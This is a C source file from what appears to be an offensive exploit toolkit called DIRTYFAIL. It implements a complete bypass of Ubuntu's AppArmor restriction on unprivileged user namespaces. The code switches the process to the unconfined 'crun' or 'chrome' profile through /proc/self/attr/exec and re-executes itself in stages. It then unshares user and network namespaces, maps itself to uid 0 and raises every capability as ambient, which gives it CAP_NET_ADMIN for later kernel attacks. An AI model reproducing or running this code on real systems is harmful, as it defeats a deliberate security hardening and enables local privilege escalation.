/*
 * DIRTYFAIL — apparmor_bypass.c
 *
 * Implementation of the "switch profile + unshare" trick for getting
 * CAP_NET_ADMIN inside a fresh user namespace on hardened Ubuntu.
 * See apparmor_bypass.h for the high-level design.
 *
 * ATTRIBUTION: technique published in 0xdeadbeefnetwork/Copy_Fail2-
 * Electric_Boogaloo (`aa-rootns.c`), credited there to Brad Spengler.
 * This is an independent reimplementation in DIRTYFAIL's structure.
 */

#include "apparmor_bypass.h"

#include <fcntl.h>
#include <sys/socket.h>
#include <sys/wait.h>

#ifdef __linux__
#include <sched.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <linux/capability.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#endif

#ifndef CLONE_NEWUSER
#define CLONE_NEWUSER 0x10000000
#endif
#ifndef CLONE_NEWNET
#define CLONE_NEWNET  0x40000000
#endif

/*
 * Once stage 2 has successfully unshared and elevated us into a fresh
 * userns with full caps, this flag is set. apparmor_bypass_needed()
 * short-circuits on it so main() doesn't re-arm the bypass after stage
 * 2 returns — that would create a NESTED userns each iteration and
 * eventually fail with ENOSPC at the nesting cap.
 *
 * The flag is process-local; it resets to false on every fresh exec,
 * which is exactly what we want — each stage's main() starts fresh.
 */
static bool g_bypass_done = false;

bool apparmor_bypass_was_armed(void) { return g_bypass_done; }

bool apparmor_userns_caps_blocked(void)
{
#ifdef __linux__
    /* Quick check: if the AA sysctl isn't there or is 0, no blocking. */
    int fd = open("/proc/sys/kernel/apparmor_restrict_unprivileged_userns",
                  O_RDONLY);
    if (fd < 0) return false;   /* no AA hardening sysctl */
    char b[8] = {0};
    ssize_t n = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0 || b[0] != '1') return false;

    /* Sysctl says hardened. Confirm by forking a child that
     * unshares(USER) and tries to write to /proc/self/setgroups —
     * a CAP_SYS_ADMIN-gated operation that would succeed inside a
     * fresh userns IFF caps survived the transition. On 26.04-style
     * hardening the auto-transition to unprivileged_userns sub-
     * profile denies the cap, write fails with EPERM. */
    pid_t pid = fork();
    if (pid < 0) return false;
    if (pid == 0) {
        if (syscall(SYS_unshare, CLONE_NEWUSER) != 0) _exit(1);
        int wfd = open("/proc/self/setgroups", O_WRONLY);
        if (wfd < 0) _exit(2);          /* EPERM here = blocked */
        ssize_t w = write(wfd, "deny", 4);
        close(wfd);
        _exit(w == 4 ? 0 : 3);          /* 0 = caps work, 3 = blocked */
    }
    int wstat = 0;
    waitpid(pid, &wstat, 0);
    /* Caps work if child exited 0; any non-zero means blocked or error. */
    return !(WIFEXITED(wstat) && WEXITSTATUS(wstat) == 0);
#else
    return false;
#endif
}

/* ---------------------------------------------------------------- *
 * Profile switch primitive
 *
 * Writing "exec <profile>" to /proc/self/attr/exec asks the kernel to
 * switch to the named AppArmor profile on the *next* execve. The
 * switch is silent if the profile doesn't exist (the next exec just
 * stays in the current profile); we don't get an error until we try
 * to use a capability the current profile would have blocked. So we
 * try multiple candidate profiles in priority order.
 * ---------------------------------------------------------------- */

#ifdef __linux__
static int change_onexec(const char *profile)
{
    int fd = open("/proc/self/attr/exec", O_WRONLY);
    if (fd < 0) return -1;
    char b[256];
    int n = snprintf(b, sizeof(b), "exec %s", profile);
    ssize_t r = write(fd, b, n);
    int e = errno;
    close(fd);
    errno = e;
    return r == n ? 0 : -1;
}

static bool write_proc(const char *path, const char *value)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return false;
    ssize_t n = write(fd, value, strlen(value));
    close(fd);
    return n == (ssize_t)strlen(value);
}
#endif

/* ---------------------------------------------------------------- *
 * Profile probe — read /proc/self/attr/current
 *
 * Output looks like one of:
 *
 *   "unconfined\n"                                    — not restricted
 *   "/usr/bin/dirtyfail (enforce)\n"                  — restricted!
 *   "unprivileged_userns (enforce)\n"                 — Ubuntu 24.04 default
 * ---------------------------------------------------------------- */

bool apparmor_bypass_needed(void)
{
#ifdef __linux__
    /* If stage 2 already ran in this process, we've already entered a
     * fresh userns with caps — don't re-arm or we'd nest further. */
    if (g_bypass_done) return false;

    /* First check the kernel sysctl. On Ubuntu 24.04 and similar
     * hardened distros, `kernel.apparmor_restrict_unprivileged_userns=1`
     * silently strips caps inside ANY userns we create — REGARDLESS of
     * whether /proc/self/attr/current shows "unconfined". This sysctl
     * is the authoritative signal; it short-circuits the probe. */
    int fd = open("/proc/sys/kernel/apparmor_restrict_unprivileged_userns", O_RDONLY);
    if (fd >= 0) {
        char b[8] = {0};
        ssize_t n = read(fd, b, sizeof(b) - 1);
        close(fd);
        if (n > 0 && b[0] == '1') return true;
    }

    /* No global sysctl restriction. AppArmor may still be enforcing
     * a per-profile rule, so check /proc/self/attr/current. If that
     * file is missing entirely, AppArmor isn't loaded → no bypass. */
    fd = open("/proc/self/attr/current", O_RDONLY);
    if (fd < 0) return false;
    char buf[256];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return false;
    buf[n] = '\0';

    /* "unconfined" with no global sysctl restriction → no bypass needed.
     * NOTE: we already excluded the Ubuntu 24.04 case above; only here
     * if the sysctl is 0 or the sysctl file doesn't exist. */
    if (strncmp(buf, "unconfined", 10) == 0) return false;

    /* Anything else (including "(enforce)" and "(complain)") is
     * potentially restricting our userns caps. Run an empirical probe:
     * fork → child does unshare(CLONE_NEWUSER) → tries to open a
     * netlink XFRM socket → if that fails, bypass IS needed. */
    pid_t pid = fork();
    if (pid < 0) return false;
    if (pid == 0) {
        if (syscall(SYS_unshare, CLONE_NEWUSER | CLONE_NEWNET) != 0)
            _exit(1);
        write_proc("/proc/self/setgroups", "deny");
        char m[64];
        snprintf(m, sizeof(m), "0 %u 1", (unsigned)getuid());
        write_proc("/proc/self/uid_map", m);
        snprintf(m, sizeof(m), "0 %u 1", (unsigned)getgid());
        write_proc("/proc/self/gid_map", m);

        /* The decisive probe: bring lo up. Needs CAP_NET_ADMIN. */
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0) _exit(2);
        struct ifreq ifr;
        memset(&ifr, 0, sizeof(ifr));
        strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
        if (ioctl(s, SIOCGIFFLAGS, &ifr) != 0) { close(s); _exit(3); }
        ifr.ifr_flags |= IFF_UP;
        int rc = ioctl(s, SIOCSIFFLAGS, &ifr);
        close(s);
        _exit(rc == 0 ? 0 : 4);
    }
    int wstat = 0;
    waitpid(pid, &wstat, 0);
    bool caps_work = WIFEXITED(wstat) && WEXITSTATUS(wstat) == 0;
    return !caps_work;
#else
    return false;
#endif
}

/* ---------------------------------------------------------------- *
 * Stage handlers
 * ---------------------------------------------------------------- */

bool apparmor_bypass_is_stage(int argc, char **argv)
{
    return argc >= 2 &&
           (strcmp(argv[1], AA_STAGE1_TAG) == 0 ||
            strcmp(argv[1], AA_STAGE2_TAG) == 0);
}

int apparmor_bypass_run_stage(int argc, char **argv,
                              int *out_argc, char ***out_argv)
{
#ifdef __linux__
    if (argc < 2) return -1;

    if (strcmp(argv[1], AA_STAGE1_TAG) == 0) {
        /* We are now in the `crun` profile (unconfined + userns).
         * Originally we did a second hop to `chrome` for extra paranoia,
         * mirroring aa-rootns; in practice that hop fails on Ubuntu
         * 24.04 with ENOSPC from the subsequent unshare for reasons
         * that aren't fully understood (possibly a per-profile userns
         * accounting wrinkle). One hop into crun is sufficient — crun
         * already has `userns,` and `flags=(unconfined)`, so unshare
         * works and we keep things simple. Just re-exec with STAGE2
         * to drop into the unshare+capset step. */
        argv[1] = (char *)AA_STAGE2_TAG;
        execv("/proc/self/exe", argv);
        return -1;   /* execv only returns on failure */
    }

    if (strcmp(argv[1], AA_STAGE2_TAG) == 0) {
        /* We are now in an unconfined profile. Do the userns + capset
         * dance ourselves so the next code path inherits root in the
         * userns and full caps. */
        uid_t u = getuid();
        gid_t g = getgid();
        if (syscall(SYS_unshare, CLONE_NEWUSER | CLONE_NEWNET) != 0) {
            log_bad("apparmor_bypass: unshare failed: %s", strerror(errno));
            return -1;
        }
        write_proc("/proc/self/setgroups", "deny");
        char m[64];
        snprintf(m, sizeof(m), "0 %u 1", (unsigned)u);
        write_proc("/proc/self/uid_map", m);
        snprintf(m, sizeof(m), "0 %u 1", (unsigned)g);
        write_proc("/proc/self/gid_map", m);

        /* Drop into uid 0 inside the new userns. */
        if (setresuid(0, 0, 0) != 0) { log_bad("setresuid: %s", strerror(errno)); }
        if (setresgid(0, 0, 0) != 0) { log_bad("setresgid: %s", strerror(errno)); }

        /* Promote permitted → inheritable, then ambient — so caps
         * survive any execvp the caller does later. */
        struct __user_cap_header_struct h = { _LINUX_CAPABILITY_VERSION_3, 0 };
        struct __user_cap_data_struct d[2];
        memset(d, 0, sizeof(d));
        if (syscall(SYS_capget, &h, d) == 0) {
            d[0].inheritable = d[0].permitted;
            d[1].inheritable = d[1].permitted;
            syscall(SYS_capset, &h, d);
            for (int c = 0; c < 64; c++)
                prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, c, 0, 0);
        }

        /* Bring lo up — most consumers need it. */
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s >= 0) {
            struct ifreq ifr;
            memset(&ifr, 0, sizeof(ifr));
            strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
            if (ioctl(s, SIOCGIFFLAGS, &ifr) == 0) {
                ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
                ioctl(s, SIOCSIFFLAGS, &ifr);
            }
            close(s);
        }

        /* Strip the stage marker from argv so main() sees its normal args. */
        for (int i = 1; i + 1 < argc; i++) argv[i] = argv[i + 1];
        argv[argc - 1] = NULL;
        *out_argc = argc - 1;
        *out_argv = argv;
        g_bypass_done = true;     /* prevents re-arm in main() */
        log_ok("apparmor bypass complete — uid=%u, in fresh userns", getuid());
        return 0;
    }
#else
    (void)argc; (void)argv; (void)out_argc; (void)out_argv;
#endif
    return -1;
}

int apparmor_bypass_fork_arm(int argc, char **argv)
{
#ifdef __linux__
    /* Caller may pass argc=0/argv=NULL; arm_and_relaunch needs a
     * valid argv[0] for execv. Fabricate a minimal one if needed. */
    char *fallback[2] = { (char *)"dirtyfail", NULL };
    if (argc <= 0 || argv == NULL || argv[0] == NULL) {
        argc = 1;
        argv = fallback;
    }

    pid_t child = fork();
    if (child < 0) return -1;
    if (child == 0) {
        /* Child arms the bypass and execs through the stages. Env
         * vars set by the caller (DIRTYFAIL_INNER_MODE etc.) survive
         * execv, so stage 2 sees them. */
        apparmor_bypass_arm_and_relaunch(argc, argv);
        /* arm_and_relaunch only returns on failure. */
        log_bad("child: bypass arm failed: %s", strerror(errno));
        _exit(1);
    }
    int wstat = 0;
    if (waitpid(child, &wstat, 0) < 0) return -1;
    if (WIFEXITED(wstat)) return WEXITSTATUS(wstat);
    if (WIFSIGNALED(wstat)) {
        log_bad("child killed by signal %d", WTERMSIG(wstat));
        return -1;
    }
    return -1;
#else
    (void)argc; (void)argv; return -1;
#endif
}

int apparmor_bypass_arm_and_relaunch(int argc, char **argv)
{
#ifdef __linux__
    /* On AppArmor-restricted systems (Ubuntu 24.04+), switch to an
     * unconfined profile via change_onexec so the post-exec userns
     * unshare retains caps. On non-AppArmor systems
     * (Debian/Alma/Fedora/etc.) /proc/self/attr/exec doesn't exist,
     * change_onexec fails — that's fine, unshare works without any
     * profile gymnastics on those kernels. Fail through gracefully. */
    if (change_onexec("crun") < 0)
        change_onexec("chrome");   /* best effort, both may no-op */

    /* Build a new argv: [argv[0], AA_STAGE1_TAG, original argv[1..]]. */
    char **na = calloc(argc + 2, sizeof(char *));
    if (!na) return -1;
    na[0] = argv[0];
    na[1] = (char *)AA_STAGE1_TAG;
    for (int i = 1; i < argc; i++) na[i + 1] = argv[i];
    na[argc + 1] = NULL;

    log_step("apparmor bypass armed — re-execing self via crun/chrome profile");
    execv("/proc/self/exe", na);
    /* If execv fails, fall through and let main() proceed un-bypassed. */
    int e = errno;
    free(na);
    errno = e;
#else
    (void)argc; (void)argv;
#endif
    return -1;
}
